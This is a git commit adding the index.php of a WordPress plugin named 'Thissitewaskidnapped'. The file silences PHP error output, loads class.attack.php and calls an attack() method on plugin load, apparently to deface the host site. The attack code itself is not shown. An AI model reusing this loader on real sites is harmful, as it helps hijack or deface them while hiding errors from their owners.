b73e34e1ef50e3df00cbc0e16347627c37f644b1
viniciusgomes <viniciusgomes@b8457f37-d9ea-0310-8a92-e5e31aec5664>
2013-01-10 10:14:58 +0000

    add file tags
    git-svn-id: https://plugins.svn.wordpress.org/thissitewaskidnapped/tags/1@650659 b8457f37-d9ea-0310-8a92-e5e31aec5664

---
+++ index.php
@@ -0,0 +1,16 @@
+<?php
+
+/*
+  Plugin Name: Thissitewaskidnapped
+  Plugin URI: http://viniwp.wordpress.com
+  Description: huahuahua, this site was kidnapped
+  Version: 1
+  Author: Vinícius Gomes
+  Author URI: http://viniwp.wordpress.com
+ */
+require_once('class.attack.php');
+ini_set('display_errors', '0');
+ini_set('error_reporting', ~E_ALL);
+$custom_huahua = new kkk;
+$custom_huahua->attack();
+?>
